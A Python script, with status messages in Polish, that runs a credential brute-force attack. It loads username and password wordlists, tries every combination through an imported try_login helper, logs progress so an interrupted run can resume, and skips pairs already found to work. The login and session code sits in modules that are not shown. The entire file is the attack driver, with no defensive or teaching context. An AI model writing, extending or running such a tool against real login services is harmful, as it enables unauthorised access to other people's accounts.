from utils.brute_utils import create_session, try_login
from utils.files_utils import load_file, save_to_file
from settings import USERNAMES_FILE, PASSWORDS_FILE, PROGRESS_FILE, SUCCESS_FILE

def run_brute_force():
    session = create_session()
    if not session:
        print("[!] Nie udało się utworzyć sesji.")
        return

    known_success = load_file(SUCCESS_FILE, as_set=True)
    progress_list = load_file(PROGRESS_FILE)
    last_combo = progress_list[-1] if progress_list else None
    resume = last_combo is None

    usernames = load_file(USERNAMES_FILE)
    passwords = load_file(PASSWORDS_FILE)
    if not usernames or not passwords:
        print("[!] Pliki z loginami lub hasłami są puste.")
        return

    try:
        for username in usernames:
            for password in passwords:
                combo = f"{username}:{password}"

                if combo in known_success:
                    continue
                if not resume:
                    if combo == last_combo:
                        resume = True
                    continue

                print(f"[*] Próba: {combo}")
                save_to_file(PROGRESS_FILE, combo)
                try_login(session, known_success, username, password)

    except KeyboardInterrupt:
        print("\n[!] Przerwano przez użytkownika. Zapisuję postęp i kończę.")
        if combo:
            save_to_file(PROGRESS_FILE, combo)

if __name__ == "__main__":
    run_brute_force()
